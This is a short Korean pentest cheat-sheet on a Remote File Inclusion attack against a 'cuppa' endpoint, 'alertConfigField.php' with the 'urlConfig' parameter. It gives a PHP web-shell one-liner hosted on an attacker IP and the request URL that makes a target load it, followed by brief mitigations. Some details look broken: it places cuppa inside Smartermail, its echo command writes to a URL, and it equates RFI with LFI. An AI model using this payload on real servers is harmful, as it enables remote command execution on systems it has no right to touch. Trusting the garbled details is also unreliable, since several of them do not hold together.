# cuppa rfi

## 개요

`cuppa`는 Smartermail(및 유사 애플리케이션)의 특수 기능 경로 아래 숨겨진 기능이다. 해당 경로에서 `urlConfig` 파라미터를 넘겨 원격 파일을 포함시키면 RFI(Remote File Inclusion)가 가능하다.

## 사용법

```bash
# 공격자가 원격 스크립트를 호스트에 두고 실행
echo '<?php system($_GET["cmd"]); ?>' > http://공격자_IP/cmd_reverse.php

# 대상에 요청
http://IP_ADDRESS/cuppa_path/alerts/alertConfigField.php?urlConfig=http://공격자_IP/cmd_reverse.php
```

## 각 파라미터의 의미

| 항목 | 의미 |
|------|------|
| `urlConfig` | 포함할 원격 스크립트 URL을 지정하는 파라미터 |
| `alertConfigField.php` | cuppa의 특수 기능 엔드포인트 예시 |
| `IP_ADDRESS` | 대상 서버 IP |

## 동작 원리

- `urlConfig` 파라미터를 통해 원격 스크립트를 로드한다.
- RFI 자체보다는 LFI와 같은 원리이므로, [rfi.md](./rfi.md)과 함께 본다.

## 대응

- `allow_url_include`가 활성화되어 있는지 확인한다.
- 경로/파라미터를 화이트리스트로 제한한다.

## 주의

- 이 문서는 Smartermail 환경 예시다. 실제 대상에는 경로와 파라미터 이름이 다를 수 있다.
- 발견한 경로와 파라미터는 노트(05-progress-tracker)에 기록한다.

## 참고 / 증적
- 발견한 내용과 증거는 노트(05-progress-tracker.md)에 함께 기록한다.
